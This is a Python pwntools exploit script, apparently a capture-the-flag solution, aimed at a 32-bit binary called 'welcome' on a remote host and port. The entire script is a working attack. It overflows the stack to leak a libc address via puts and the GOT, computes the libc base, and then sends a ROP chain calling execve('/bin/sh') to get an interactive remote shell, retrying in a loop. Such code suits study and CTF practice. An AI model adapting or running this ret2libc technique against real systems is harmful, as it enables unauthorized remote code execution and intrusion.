#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 54.225.38.91 --port 1028 ./welcome
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./welcome')
libc = ELF('libc6_2.30-0ubuntu2_i386.so')
context.terminal = ['tmux', 'splitw', '-h']
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '54.225.38.91'
port = int(args.PORT or 1028)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    global libc
    libc = ELF('/lib32/libc.so.6')
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x8049200
continue
'''.format(**locals())

#if we hit our payload, its either on offset 8, or 8 + (16 * n) into our payload, so we spam the payload 6 times. 
stage1 = b'AAAAAAAA' + (p32(exe.plt['puts']) + p32(exe.symbols['_start'])+ p32(exe.got['stdout'])  + b'BBBB') * 6 + b'CCCC'
win = False
while(True):
    try:
        io = start()
        #stage 1, leak libc
        io.recvuntil('o/\n\n')
        io.sendline(stage1)
        data = io.recvline()
        leak =  u32(data[0:4])
        log.info("Libc leak: {}".format(hex(leak)))
        libc.address = leak - libc.symbols['stdout']
        log.info("libc base: {}".format(hex(libc.address)))

        #stage 2, pop shell
        rop = ROP(libc)
        #system did not work locally for some reason, so using execve.
        rop.execve(next(libc.search(b'/bin/sh')), 0,0)
        payload = (b'A' * 24) + rop.chain()
        payload += b'X' * (108-len(payload))
        io.sendline(payload)
        win = True
        io.interactive()
        io.close()
        exit(1)
    except:
        if win:
            exit(1)
        io.close()
        pass
